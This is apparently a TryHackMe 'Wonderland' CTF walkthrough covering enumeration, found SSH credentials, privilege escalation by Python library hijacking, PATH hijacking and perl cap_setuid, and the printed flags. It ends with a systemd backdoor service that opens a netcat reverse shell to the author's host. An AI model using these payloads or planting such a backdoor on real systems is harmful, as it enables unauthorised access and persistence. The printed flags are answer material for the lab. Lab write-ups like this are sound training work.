# [Wonderland](https://tryhackme.com/room/wonderland)

```
export IP=10.10.14.159
```

---

## Task 1
1. User flag

	a. Nmap scan (`nmap -sV -sC -oN nmap/initial $IP`):
	```
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 07:25 EDT
	Nmap scan report for 10.10.204.12
	Host is up (0.12s latency).
	Not shown: 998 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
	|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
	|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
	80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
	|_http-title: Follow the white rabbit.
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 45.00 seconds

	```

	b. Gobuster scan (`gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster-common.log`):
	```
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.204.12
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2022/10/02 07:26:19 Starting gobuster in directory enumeration mode
	===============================================================
	/img                  (Status: 301) [Size: 0] [--> img/]
	/index.html           (Status: 301) [Size: 0] [--> ./]  
	/r                    (Status: 301) [Size: 0] [--> r/]  
	                                                        
	===============================================================
	2022/10/02 07:27:07 Finished
	===============================================================
	```

	c. Found the URL, `http://$IP/r/a/b/b/i/t`, by first going to the /r path then running gobuster again, then finding the /a path, then running gobuster, and so on until I found the pattern.

	d. Inpected the page's source code and found what seems to be SSH credentials:
	```
	alice
	HowDothTheLittleCrocodileImproveHisShiningTail
	```

	e. SSH doesn't seem to be working and the page seems to be acting funky so I restarted the machine.

	f. That didn't work so I turned off my own personal VPN and restarted the OpenVPN connection and was able to get an SSH connection.

	g. Now that we're in. We run `ls` and see that the `root.txt` file is in alice's home directory. It can't be read, but it's curious as to why it would be there. In fact, it begs the question, is the `user.txt` flag in the root directory? Doesn't hurt to check...

	h. Found the `user.txt` flag @ `/root/user.txt`:
	```
	thm{"Curiouser and curiouser!"}
	```


2. Root flag

	a. Ran a `sudo -l` to see what damage I could do as alice.
	```
	[sudo] password for alice: 
	Matching Defaults entries for alice on wonderland:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User alice may run the following commands on wonderland:
	    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
	```

	b. Looks like I can run a Python script to gain access to the `rabbit` user.

	c. After taking a look at the Python script, `walrus_and_the_carpenter.py`, I noticed that it doesn't have a shabang at the top so I'm wondering if I can exploit that...

	d. I think I can create my own `random.py` file in the same directory as `walrus_and_the_carpenter.py` so that anytime `walrus_and_the_carpenter.py` is called, it executed my `random.py` file instead of the built-in python module, `random`.

	e. Created `random.py` with the following contents:
	```
	#!/usr/bin/python3.6
	import os
	os.system("/bin/bash")
	```

	f. Then I executed the exploit:
	```
	sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
	```

	g. BOOM! Gained access to the `rabbit` user.

	h. Looking in `rabbit`'s home directory, we find an executable, `./teaParty`, which when run outputs the following:
	```
	Welcome to the tea party!
	The Mad Hatter will be here soon.
	Probably by Mon, 03 Oct 2022 02:55:56 +0000
	Ask very nicely, and I will give you some tea while you wait for him
	```

	i. Looks like it's a callout to when something gets executed as the `hatter` user. Another privilege escalation opportunity perhaps??

	j. Created a `bin` folder inside `/home/rabbit` and created an executable named `date` with the following contents:
	```
	#!/bin/bash
	/bin/bash -p
	```

	k. Next, I exported the new bin folder to the PATH variable:
	```
	export PATH=/home/rabbit/bin:$PATH
	```

	l. Finally, I reran the `teaParty` executable at `/home/rabbit/teaParty` and was able to become the user, `hatter`.

	m. Going to `hatter`'s home directory, I found a `password.txt` file with the string:
	```
	WhyIsARavenLikeAWritingDesk?
	```

	n. Used that password to SSH as `hatter`. For a cleaner shell.

	o. Downloaded `linpeas.sh` on the target and ran it. Found a potential vulnerability:
	```
	Files with capabilities (limited to 50):
	/usr/bin/perl5.26.1 = cap_setuid+ep
	/usr/bin/mtr-packet = cap_net_raw+ep
	/usr/bin/perl = cap_setuid+ep
	```

	p. Googled `cap_setuid perl` and found `https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/`. In it they have the exploit:
	```
	perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
	```

	q. AND BOOM! Root baby! Found the root flag @ `/home/alice/root.txt`:
	```
	thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
	```

	r. For fun, I played around with creating different backdoors. I created one using SSH and another using a service that executes at reboot. For the service, this is the code I used (thanks to `https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99`):
	```
	# Placed at /etc/systemd/system/backdoor.service
	[Unit]
	Description=Very important backdoor.

	[Service]
	Type=simple
	ExecStartPre=/bin/mknod /tmp/backpipe p
	ExecStart=/bin/bash -c '/bin/mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | /bin/nc $MY_IP 1111 1>/tmp/backpipe'

	[Install]
	WantedBy=multi-user.target
	```
